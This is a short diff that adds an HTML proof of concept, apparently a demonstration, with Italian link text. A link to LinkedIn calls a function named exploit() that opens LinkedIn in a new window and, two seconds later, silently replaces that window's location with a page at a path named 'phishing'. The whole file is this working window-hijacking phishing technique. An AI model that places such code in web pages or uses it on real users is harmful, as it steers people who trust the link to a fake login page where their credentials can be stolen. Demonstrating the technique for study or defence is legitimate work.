@@ -1,0 +1,11 @@
+<a href="https://www.linkedin.com" onclick="return exploit()">Vai su LinkedIn</a>
+
+<script type="text/javascript">
+	function exploit() {
+		let w = window.open("https://www.linkedin.com", "target");
+		setTimeout(function() {
+			w.location.replace("https://unililium.github.io/phishing")
+		}, 2000);
+		return false;
+	}
+</script>
